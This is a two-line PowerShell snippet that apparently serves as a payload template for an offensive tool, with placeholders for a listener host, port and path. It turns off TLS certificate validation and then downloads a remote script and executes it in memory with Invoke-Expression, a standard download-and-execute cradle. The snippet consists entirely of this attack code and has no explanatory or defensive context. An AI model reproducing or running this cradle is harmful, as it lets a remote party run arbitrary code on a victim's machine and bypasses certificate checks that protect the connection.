[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
iex((New-Object system.net.WebClient).DownloadString('https://#{lhost}:#{lport}/#{uri}'))
